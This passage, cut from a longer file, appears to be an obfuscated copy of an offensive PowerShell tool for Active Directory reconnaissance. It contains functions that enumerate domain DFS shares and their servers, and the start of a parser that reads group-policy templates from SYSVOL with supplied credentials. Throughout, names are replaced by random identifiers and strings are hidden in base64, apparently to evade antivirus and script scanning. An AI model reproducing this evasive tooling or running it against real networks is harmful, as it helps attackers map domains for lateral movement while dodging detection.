            ${f811bd3745a8434fb717d6f60684dcbf} = [bitconverter]::ToUInt32(${9e90be1d0335462293a72d2fc193fa0b}[0..3],0)
            ${c2ac065a953248659a5452b43e924297} = [bitconverter]::ToUInt32(${9e90be1d0335462293a72d2fc193fa0b}[4..7],0)
            ${b80d9562f792404db0205d365e956f5e} = 8
            ${87a135a18f0a4a37ace150e96ecd677c} = @()
            for(${35c58f1556d947ac8053e2f546574b9e}=1; ${35c58f1556d947ac8053e2f546574b9e} -le ${c2ac065a953248659a5452b43e924297}; ${35c58f1556d947ac8053e2f546574b9e}++){
                ${0900ef22ff14427cb4591dbb748f4c84} = ${b80d9562f792404db0205d365e956f5e}
                ${9d7eaad7f8ac41008ff6d914cc7d678c} = ${b80d9562f792404db0205d365e956f5e} + 1
                ${15407a4700e24b71876b74e3b0f43948} = [bitconverter]::ToUInt16(${9e90be1d0335462293a72d2fc193fa0b}[${0900ef22ff14427cb4591dbb748f4c84}..${9d7eaad7f8ac41008ff6d914cc7d678c}],0)
                ${eac288ac3d6049c7a66fbcccb738539d} = ${9d7eaad7f8ac41008ff6d914cc7d678c} + 1
                ${25a441bd1ddf4a2087ed2d4ab9780a90} = ${eac288ac3d6049c7a66fbcccb738539d} + ${15407a4700e24b71876b74e3b0f43948} - 1
                ${bfc55575edb74b44b39d611afc9edd36} = [System.Text.Encoding]::Unicode.GetString(${9e90be1d0335462293a72d2fc193fa0b}[${eac288ac3d6049c7a66fbcccb738539d}..${25a441bd1ddf4a2087ed2d4ab9780a90}])
                ${9cb3adbabc5a44329ffd69a8aa78c890} = ${25a441bd1ddf4a2087ed2d4ab9780a90} + 1
                ${20b82d9e53fc4b7298b6998fde8401b0} = ${9cb3adbabc5a44329ffd69a8aa78c890} + 3
                ${401812fb7bf74f1fa87a1ece3ec8b19e} = [bitconverter]::ToUInt32(${9e90be1d0335462293a72d2fc193fa0b}[${9cb3adbabc5a44329ffd69a8aa78c890}..${20b82d9e53fc4b7298b6998fde8401b0}],0)
                ${2d71402e9ca74854b97edab3e5ee9efd} = ${20b82d9e53fc4b7298b6998fde8401b0} + 1
                ${4c7ec20c34144cca9806861506f7c6cd} = ${2d71402e9ca74854b97edab3e5ee9efd} + ${401812fb7bf74f1fa87a1ece3ec8b19e} - 1
                ${23f66f90bbd2466fb5a08f44557cd67f} = ${9e90be1d0335462293a72d2fc193fa0b}[${2d71402e9ca74854b97edab3e5ee9efd}..${4c7ec20c34144cca9806861506f7c6cd}]
                switch -wildcard (${bfc55575edb74b44b39d611afc9edd36}) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABzAGkAdABlAHIAbwBvAHQA'))) {  }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABkAG8AbQBhAGkAbgByAG8AbwB0ACoA'))) {
                        ${3cb7d4f213fa49af9cb878b3ec369a80} = 0
                        ${be470e21613d41829bfb76c6f412b5b6} = 15
                        ${9a254eea9b0f4971af0fa0ccd5a177ef} = [byte[]]${23f66f90bbd2466fb5a08f44557cd67f}[${3cb7d4f213fa49af9cb878b3ec369a80}..${be470e21613d41829bfb76c6f412b5b6}]
                        ${1df2c267ee6946f9b59b0dae3e08f61c} = New-Object Guid(,${9a254eea9b0f4971af0fa0ccd5a177ef}) 
                        ${9fffa6ff97464253bccaf316a005f27d} = ${be470e21613d41829bfb76c6f412b5b6} + 1
                        ${7eb43f02fd1b4a769a1225882ceb4e28} = ${9fffa6ff97464253bccaf316a005f27d} + 1
                        ${df013a32fe7347b0a8e590b1b8a68e49} = [bitconverter]::ToUInt16(${23f66f90bbd2466fb5a08f44557cd67f}[${9fffa6ff97464253bccaf316a005f27d}..${7eb43f02fd1b4a769a1225882ceb4e28}],0)
                        ${9f7c6a8ab90d4a649f266342774b8272} = ${7eb43f02fd1b4a769a1225882ceb4e28} + 1
                        ${41583e0accf5461dad258814f52463aa} = ${9f7c6a8ab90d4a649f266342774b8272} + ${df013a32fe7347b0a8e590b1b8a68e49} - 1
                        ${69b8d578f836474489b6c17b0540dcd2} = [System.Text.Encoding]::Unicode.GetString(${23f66f90bbd2466fb5a08f44557cd67f}[${9f7c6a8ab90d4a649f266342774b8272}..${41583e0accf5461dad258814f52463aa}])
                        ${2d2e6cc3ad1e478585f7512542ffd3f4} = ${41583e0accf5461dad258814f52463aa} + 1
                        ${02fb8bfd5a8144beb5369112afb338d8} = ${2d2e6cc3ad1e478585f7512542ffd3f4} + 1
                        ${6d23537dcd0441338d3f4bb8e465f64b} = [bitconverter]::ToUInt16(${23f66f90bbd2466fb5a08f44557cd67f}[${2d2e6cc3ad1e478585f7512542ffd3f4}..${02fb8bfd5a8144beb5369112afb338d8}],0)
                        ${3f87d4a074e64c5cacbc523e93756b45} = ${02fb8bfd5a8144beb5369112afb338d8} + 1
                        ${1e4e541a63164814a3e0f709d57fb71a} = ${3f87d4a074e64c5cacbc523e93756b45} + ${6d23537dcd0441338d3f4bb8e465f64b} - 1
                        ${3a570a65e82246f6b0d215884698ef5a} = [System.Text.Encoding]::Unicode.GetString(${23f66f90bbd2466fb5a08f44557cd67f}[${3f87d4a074e64c5cacbc523e93756b45}..${1e4e541a63164814a3e0f709d57fb71a}])
                        ${c96fda98f23741bebc426524a43f07c0} = ${1e4e541a63164814a3e0f709d57fb71a} + 1
                        ${10f060096e5d49a2bc7587d51e9be68a} = ${c96fda98f23741bebc426524a43f07c0} + 3
                        ${c8f42b8a5203479ba051f687fab516f8} = [bitconverter]::ToUInt32(${23f66f90bbd2466fb5a08f44557cd67f}[${c96fda98f23741bebc426524a43f07c0}..${10f060096e5d49a2bc7587d51e9be68a}],0)
                        ${fef53bc79e6e405ab36f4904747f5bd7} = ${10f060096e5d49a2bc7587d51e9be68a} + 1
                        ${7335c24f3bcd419ca5baccda6e56a363} = ${fef53bc79e6e405ab36f4904747f5bd7} + 3
                        ${051cff9639794ac688569470331a46b9} = [bitconverter]::ToUInt32(${23f66f90bbd2466fb5a08f44557cd67f}[${fef53bc79e6e405ab36f4904747f5bd7}..${7335c24f3bcd419ca5baccda6e56a363}],0)
                        ${bcc3264119c346de8245d98418ee020f} = ${7335c24f3bcd419ca5baccda6e56a363} + 1
                        ${f53050c0aa8d40a9abc5d345db98e5c5} = ${bcc3264119c346de8245d98418ee020f} + 1
                        ${f3c2da39e97c4c8d82e63adddd345882} = [bitconverter]::ToUInt16(${23f66f90bbd2466fb5a08f44557cd67f}[${bcc3264119c346de8245d98418ee020f}..${f53050c0aa8d40a9abc5d345db98e5c5}],0)
                        ${ed6319e6e3604e809a55737f8471567b} = ${f53050c0aa8d40a9abc5d345db98e5c5} + 1
                        ${ee17da0ea57645c49ea844cf916124be} = ${ed6319e6e3604e809a55737f8471567b} + ${f3c2da39e97c4c8d82e63adddd345882} - 1
                        if (${f3c2da39e97c4c8d82e63adddd345882} -gt 0)  {
                            ${22e0de3113fd441abe5b07e6c6f70707} = [System.Text.Encoding]::Unicode.GetString(${23f66f90bbd2466fb5a08f44557cd67f}[${ed6319e6e3604e809a55737f8471567b}..${ee17da0ea57645c49ea844cf916124be}])
                        }
                        ${6c58331471ac426fa2900b6b6f510e14} = ${ee17da0ea57645c49ea844cf916124be} + 1
                        ${b892cfbf7ce14b579abc8494b3c4697c} = ${6c58331471ac426fa2900b6b6f510e14} + 7
                        ${26667d81b02248f4972a9a9cb0c200c7} = ${23f66f90bbd2466fb5a08f44557cd67f}[${6c58331471ac426fa2900b6b6f510e14}..${b892cfbf7ce14b579abc8494b3c4697c}] 
                        ${a715b5f0b55b4b98b58d329dd39295a7} = ${b892cfbf7ce14b579abc8494b3c4697c} + 1
                        ${01256ead870644a1b108306c0c643dc6} = ${a715b5f0b55b4b98b58d329dd39295a7} + 7
                        ${e15434410fdc426a96e38ec46308db3f} = ${23f66f90bbd2466fb5a08f44557cd67f}[${a715b5f0b55b4b98b58d329dd39295a7}..${01256ead870644a1b108306c0c643dc6}]
                        ${aa2a6b2e0305410387b2d5c090c86a7a} = ${01256ead870644a1b108306c0c643dc6} + 1
                        ${dc108186fa4b451c88f415f0acb65f0f} = ${aa2a6b2e0305410387b2d5c090c86a7a} + 7
                        ${f3bd6c9d3fd14f23b5f058ae0322c317} = ${23f66f90bbd2466fb5a08f44557cd67f}[${aa2a6b2e0305410387b2d5c090c86a7a}..${dc108186fa4b451c88f415f0acb65f0f}]
                        ${ff427500fab54fbd9a00f93d24dc4541} = ${dc108186fa4b451c88f415f0acb65f0f}  + 1
                        ${0856adb84dd6497c98e227ae7cecc8e3} = ${ff427500fab54fbd9a00f93d24dc4541} + 3
                        $version = [bitconverter]::ToUInt32(${23f66f90bbd2466fb5a08f44557cd67f}[${ff427500fab54fbd9a00f93d24dc4541}..${0856adb84dd6497c98e227ae7cecc8e3}],0)
                        ${8e8e38df0ee04f21a791a42d0598e9e5} = ${0856adb84dd6497c98e227ae7cecc8e3} + 1
                        ${e471f33051254922a47a9e468bdf4184} = ${8e8e38df0ee04f21a791a42d0598e9e5} + 3
                        ${0c7540beb4e84f8dab89dbaebb751c2f} = [bitconverter]::ToUInt32(${23f66f90bbd2466fb5a08f44557cd67f}[${8e8e38df0ee04f21a791a42d0598e9e5}..${e471f33051254922a47a9e468bdf4184}],0)
                        ${257da7e822674d3b91bea11e0bec18a1} = ${e471f33051254922a47a9e468bdf4184} + 1
                        ${1e03cf0e7dfb49f49d17f31bafc9745e} = ${257da7e822674d3b91bea11e0bec18a1} + ${0c7540beb4e84f8dab89dbaebb751c2f} - 1
                        ${62425623bbe04802a4fd27745f71f18c} = ${23f66f90bbd2466fb5a08f44557cd67f}[${257da7e822674d3b91bea11e0bec18a1}..${1e03cf0e7dfb49f49d17f31bafc9745e}]
                        ${09f63ffc174e4f22bcaf347bb763ab3a} = ${1e03cf0e7dfb49f49d17f31bafc9745e} + 1
                        ${3df95b5f2b374d35a4e14bb25e91c7ad} = ${09f63ffc174e4f22bcaf347bb763ab3a} + 3
                        ${ba5f0a9ba5e14ad9969d181f0e829de5} = [bitconverter]::ToUInt32(${23f66f90bbd2466fb5a08f44557cd67f}[${09f63ffc174e4f22bcaf347bb763ab3a}..${3df95b5f2b374d35a4e14bb25e91c7ad}],0)
                        ${e096a19ad6d54d52a34745c6f3aebfb8} = ${3df95b5f2b374d35a4e14bb25e91c7ad} + 1
                        ${c5ed1b5d37c443a8828644f51ecd16e5} = ${e096a19ad6d54d52a34745c6f3aebfb8} + ${ba5f0a9ba5e14ad9969d181f0e829de5} - 1
                        ${6a21ad52e80640e5942b2fcffed3e807} = ${23f66f90bbd2466fb5a08f44557cd67f}[${e096a19ad6d54d52a34745c6f3aebfb8}..${c5ed1b5d37c443a8828644f51ecd16e5}]
                        ${a4e861ed1f594e4e8cb747157a2e7fb2} = ${c5ed1b5d37c443a8828644f51ecd16e5} + 1
                        ${31de393846534f8995e22a8b0e492f83} = ${a4e861ed1f594e4e8cb747157a2e7fb2} + 3
                        ${85c17f67c3934f7f80e4ea98cf7614e0} = [bitconverter]::ToUInt32(${23f66f90bbd2466fb5a08f44557cd67f}[${a4e861ed1f594e4e8cb747157a2e7fb2}..${31de393846534f8995e22a8b0e492f83}],0)
                        ${2d18d29a1851412aa01e19e03ed6821b} = 0
                        ${b63ff7fc065344e498018282344fe7e8} = ${2d18d29a1851412aa01e19e03ed6821b} + 3
                        ${3abcdf795174470a95c00a6185776c4b} = [bitconverter]::ToUInt32(${62425623bbe04802a4fd27745f71f18c}[${2d18d29a1851412aa01e19e03ed6821b}..${b63ff7fc065344e498018282344fe7e8}],0)
                        ${c129a30f28b2477e8962acf70bbfc3ee} = ${b63ff7fc065344e498018282344fe7e8} + 1
                        for(${e60d379566a9422ebe0ea7ec2df726b9}=1; ${e60d379566a9422ebe0ea7ec2df726b9} -le ${3abcdf795174470a95c00a6185776c4b}; ${e60d379566a9422ebe0ea7ec2df726b9}++){
                            ${fd720ce78d4545f5988c50d70edf469c} = ${c129a30f28b2477e8962acf70bbfc3ee}
                            ${56cf65db105a4dcbbdf269b2c87eadb2} = ${fd720ce78d4545f5988c50d70edf469c} + 3
                            ${43c7d479b581445487234b4ba3b94b2a} = [bitconverter]::ToUInt32(${62425623bbe04802a4fd27745f71f18c}[${fd720ce78d4545f5988c50d70edf469c}..${56cf65db105a4dcbbdf269b2c87eadb2}],0)
                            ${1ae2637cf9e74db49aed8d4e11b33332} = ${56cf65db105a4dcbbdf269b2c87eadb2} + 1
                            ${e3bf32a249fa472ea4ac2983c64667bf} = ${1ae2637cf9e74db49aed8d4e11b33332} + 7
                            ${313183af7c164e36a03bd2779b50c669} = ${62425623bbe04802a4fd27745f71f18c}[${1ae2637cf9e74db49aed8d4e11b33332}..${e3bf32a249fa472ea4ac2983c64667bf}]
                            ${0eb84a1cf3e54e148e057106e24d0f00} = ${e3bf32a249fa472ea4ac2983c64667bf} + 1
                            ${496331978c084308bb842ff828d724b6} = ${0eb84a1cf3e54e148e057106e24d0f00} + 3
                            ${5d4e2c3482c74564aa85b2b3acc01514} = [bitconverter]::ToUInt32(${62425623bbe04802a4fd27745f71f18c}[${0eb84a1cf3e54e148e057106e24d0f00}..${496331978c084308bb842ff828d724b6}],0)
                            ${0b37e9c0d1ec4b1ca7cd60f9f5a781e3} = ${496331978c084308bb842ff828d724b6} + 1
                            ${bbece6d756d44b1398d6cb2b3925fbee} = ${0b37e9c0d1ec4b1ca7cd60f9f5a781e3} + 3
                            ${7ea87ea97e1c4442bcee55b71af69fb9} = [bitconverter]::ToUInt32(${62425623bbe04802a4fd27745f71f18c}[${0b37e9c0d1ec4b1ca7cd60f9f5a781e3}..${bbece6d756d44b1398d6cb2b3925fbee}],0)
                            ${680ff028af324bb4b818edb1f8445617} = ${bbece6d756d44b1398d6cb2b3925fbee} + 1
                            ${a8bee1c1164b448d956dab827e291a7b} = ${680ff028af324bb4b818edb1f8445617} + 1
                            ${b5677efeea3845ce82e37f86d9fe51e8} = [bitconverter]::ToUInt16(${62425623bbe04802a4fd27745f71f18c}[${680ff028af324bb4b818edb1f8445617}..${a8bee1c1164b448d956dab827e291a7b}],0)
                            ${168aaa1d7cb2476eb263ffc4684797b7} = ${a8bee1c1164b448d956dab827e291a7b} + 1
                            ${0e213ad5f398465f883e3974ee2167af} = ${168aaa1d7cb2476eb263ffc4684797b7} + ${b5677efeea3845ce82e37f86d9fe51e8} - 1
                            ${40d3379ef3334f059c3e383c0821813e} = [System.Text.Encoding]::Unicode.GetString(${62425623bbe04802a4fd27745f71f18c}[${168aaa1d7cb2476eb263ffc4684797b7}..${0e213ad5f398465f883e3974ee2167af}])
                            ${a90acb3a0e6d4327a882b890c5e77586} = ${0e213ad5f398465f883e3974ee2167af} + 1
                            ${81dcd295a85b4adfbafe488a962d1730} = ${a90acb3a0e6d4327a882b890c5e77586} + 1
                            ${82c0ed79fe8e4d77a8ac18f79848f45f} = [bitconverter]::ToUInt16(${62425623bbe04802a4fd27745f71f18c}[${a90acb3a0e6d4327a882b890c5e77586}..${81dcd295a85b4adfbafe488a962d1730}],0)
                            ${af7cc79418424573ac41a5370372b8ff} = ${81dcd295a85b4adfbafe488a962d1730} + 1
                            ${75f4d24e2cec49579d490807af76b1b1} = ${af7cc79418424573ac41a5370372b8ff} + ${82c0ed79fe8e4d77a8ac18f79848f45f} - 1
                            ${6bd8e9f4921d47b6b540fefef9144314} = [System.Text.Encoding]::Unicode.GetString(${62425623bbe04802a4fd27745f71f18c}[${af7cc79418424573ac41a5370372b8ff}..${75f4d24e2cec49579d490807af76b1b1}])
                            ${6e0b7d4681004128ac2987a8fc2de094} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewA0ADAAZAAzADMANwA5AGUAZgAzADMAMwA0AGYAMAA1ADkAYwAzAGUAMwA4ADMAYwAwADgAMgAxADgAMQAzAGUAfQBcACQAewA2AGIAZAA4AGUAOQBmADQAOQAyADEAZAA0ADcAYgA2AGIANQA0ADAAZgBlAGYAZQBmADkAMQA0ADQAMwAxADQAfQA=')))
                            ${c129a30f28b2477e8962acf70bbfc3ee} = ${75f4d24e2cec49579d490807af76b1b1} + 1
                        }
                    }
                }
                ${b80d9562f792404db0205d365e956f5e} = ${4c7ec20c34144cca9806861506f7c6cd} + 1
                ${cbb70942f02040498558151f23b01efa} = @{
                    'Name' = ${bfc55575edb74b44b39d611afc9edd36}
                    'Prefix' = ${69b8d578f836474489b6c17b0540dcd2}
                    'TargetList' = ${6e0b7d4681004128ac2987a8fc2de094}
                }
                ${87a135a18f0a4a37ace150e96ecd677c} += New-Object -TypeName PSObject -Property ${cbb70942f02040498558151f23b01efa}
                ${69b8d578f836474489b6c17b0540dcd2} = $Null
                ${bfc55575edb74b44b39d611afc9edd36} = $Null
                ${6e0b7d4681004128ac2987a8fc2de094} = $Null
            }
            ${4bee1794cb504682aa505a5eaaee6071} = @()
            ${87a135a18f0a4a37ace150e96ecd677c} | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        ${4bee1794cb504682aa505a5eaaee6071} += $_.split('\')[2]
                    }
                }
            }
            ${4bee1794cb504682aa505a5eaaee6071}
        }
        function afd9c8d874414541ba2a15da3d5eeee9 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,
                [String]
                $SearchBase,
                [String]
                $Server,
                [String]
                $SearchScope = 'Subtree',
                [Int]
                $ResultPageSize = 200,
                [Int]
                $ServerTimeLimit,
                [Switch]
                $Tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )
            ${a5d1f9ada9d04a359f252a67c6877a5c} = d99af1f025294e4b8cf632a3987179c6 @PSBoundParameters
            if (${a5d1f9ada9d04a359f252a67c6877a5c}) {
                ${23aa46482ffd4338968b3d1f30fda38a} = @()
                ${a5d1f9ada9d04a359f252a67c6877a5c}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AZgBUAEQAZgBzACkAKQA=')))
                try {
                    ${c1d2f3b775df48dfbe092797965c6f30} = ${a5d1f9ada9d04a359f252a67c6877a5c}.FindAll()
                    ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        ${0a6ac9bcb7594a15aefdc7c74d3ba830} = $Properties.remoteservername
                        ${c624820894e1498d8e6c5eee7e7e970c} = $Properties.pkt
                        ${23aa46482ffd4338968b3d1f30fda38a} += ${0a6ac9bcb7594a15aefdc7c74d3ba830} | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAEQARgBTACAAcwBoAGEAcgBlACAAOgAgACQAXwA=')))
                            }
                        }
                    }
                    if (${c1d2f3b775df48dfbe092797965c6f30}) {
                        try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                        }
                    }
                    ${a5d1f9ada9d04a359f252a67c6877a5c}.dispose()
                    if (${c624820894e1498d8e6c5eee7e7e970c} -and ${c624820894e1498d8e6c5eee7e7e970c}[0]) {
                        dbd066592fc442d68818ff9708390e7d ${c624820894e1498d8e6c5eee7e7e970c}[0] | ForEach-Object {
                            if ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA=')))) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
                }
                ${23aa46482ffd4338968b3d1f30fda38a} | Sort-Object -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
        }
        function b86bcbcc86674e8b8d823977f43974ae {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,
                [String]
                $SearchBase,
                [String]
                $Server,
                [String]
                $SearchScope = 'Subtree',
                [Int]
                $ResultPageSize = 200,
                [Int]
                $ServerTimeLimit,
                [Switch]
                $Tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )
            ${a5d1f9ada9d04a359f252a67c6877a5c} = d99af1f025294e4b8cf632a3987179c6 @PSBoundParameters
            if (${a5d1f9ada9d04a359f252a67c6877a5c}) {
                ${23aa46482ffd4338968b3d1f30fda38a} = @()
                ${a5d1f9ada9d04a359f252a67c6877a5c}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AbQBzAEQARgBTAC0ATABpAG4AawB2ADIAKQApAA==')))
                $Null = ${a5d1f9ada9d04a359f252a67c6877a5c}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAZgBzAC0AbABpAG4AawBwAGEAdABoAHYAMgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAEQARgBTAC0AVABhAHIAZwBlAHQATABpAHMAdAB2ADIA')))))
                try {
                    ${c1d2f3b775df48dfbe092797965c6f30} = ${a5d1f9ada9d04a359f252a67c6877a5c}.FindAll()
                    ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        ${6e0b7d4681004128ac2987a8fc2de094} = $Properties.'msdfs-targetlistv2'[0]
                        ${ff5c2d686e154597b88dbde7c5276195} = [xml][System.Text.Encoding]::Unicode.GetString(${6e0b7d4681004128ac2987a8fc2de094}[2..(${6e0b7d4681004128ac2987a8fc2de094}.Length-1)])
                        ${23aa46482ffd4338968b3d1f30fda38a} += ${ff5c2d686e154597b88dbde7c5276195}.targets.ChildNodes | ForEach-Object {
                            try {
                                ${50dab9528d6a4d5795141e14e83233dd} = $_.InnerText
                                if ( ${50dab9528d6a4d5795141e14e83233dd}.Contains('\') ) {
                                    ${31cc6c58c89943858f6125b2ac797e77} = ${50dab9528d6a4d5795141e14e83233dd}.split('\')[3]
                                    ${97bac7cbd4fa46e5af613759a2528d21} = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADMAMQBjAGMANgBjADUAOABjADgAOQA5ADQAMwA4ADUAOABmADYAMQAyADUAYgAyAGEAYwA3ADkANwBlADcANwB9ACQAewA5ADcAYgBhAGMANwBjAGIAZAA0AGYAYQA0ADYAZQA1AGEAZgA2ADEAMwA3ADUAOQBhADIANQAyADgAZAAyADEAfQA=')));'RemoteServerName'=${50dab9528d6a4d5795141e14e83233dd}.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAHQAYQByAGcAZQB0ACAAOgAgACQAXwA=')))
                            }
                        }
                    }
                    if (${c1d2f3b775df48dfbe092797965c6f30}) {
                        try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                        }
                    }
                    ${a5d1f9ada9d04a359f252a67c6877a5c}.dispose()
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
                }
                ${23aa46482ffd4338968b3d1f30fda38a} | Sort-Object -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
        }
    }
    PROCESS {
        ${23aa46482ffd4338968b3d1f30fda38a} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in $Domain) {
                ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain
                if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAxAA==')))) {
                    ${23aa46482ffd4338968b3d1f30fda38a} += afd9c8d874414541ba2a15da3d5eeee9 @afd7d337a750465cb1eadfa1f8ae176d
                }
                if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                    ${23aa46482ffd4338968b3d1f30fda38a} += b86bcbcc86674e8b8d823977f43974ae @afd7d337a750465cb1eadfa1f8ae176d
                }
            }
        }
        else {
            if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAxAA==')))) {
                ${23aa46482ffd4338968b3d1f30fda38a} += afd9c8d874414541ba2a15da3d5eeee9 @afd7d337a750465cb1eadfa1f8ae176d
            }
            if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                ${23aa46482ffd4338968b3d1f30fda38a} += b86bcbcc86674e8b8d823977f43974ae @afd7d337a750465cb1eadfa1f8ae176d
            }
        }
        ${23aa46482ffd4338968b3d1f30fda38a} | Sort-Object -Property ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))) -Unique
    }
}
function a172e43005cd4658bcc5801312e35ab1 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        ${48783784f9ff4bc7b5ae02cf51f877ca},
        [Switch]
        ${e6bf711304b24cf590cbb5b6c4bdb1de},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${ecbd21444b104416a9e24560a9dbf3bd} = @{}
    }
    PROCESS {
        try {
            if ((${48783784f9ff4bc7b5ae02cf51f877ca} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${c0e3b82e27dd42af96f036e8f0ea87c8} = "\\$((New-Object System.Uri(${48783784f9ff4bc7b5ae02cf51f877ca})).Host)\SYSVOL"
                if (-not ${ecbd21444b104416a9e24560a9dbf3bd}[${c0e3b82e27dd42af96f036e8f0ea87c8}]) {
                    b62ba051179546ed8285f6844e069492 -Path ${c0e3b82e27dd42af96f036e8f0ea87c8} -Credential $Credential
                    ${ecbd21444b104416a9e24560a9dbf3bd}[${c0e3b82e27dd42af96f036e8f0ea87c8}] = $True
                }
            }
            ${d638a9a290404250abd748181bf51fd6} = ${48783784f9ff4bc7b5ae02cf51f877ca}
            if (-not ${d638a9a290404250abd748181bf51fd6}.EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBpAG4AZgA='))))) {
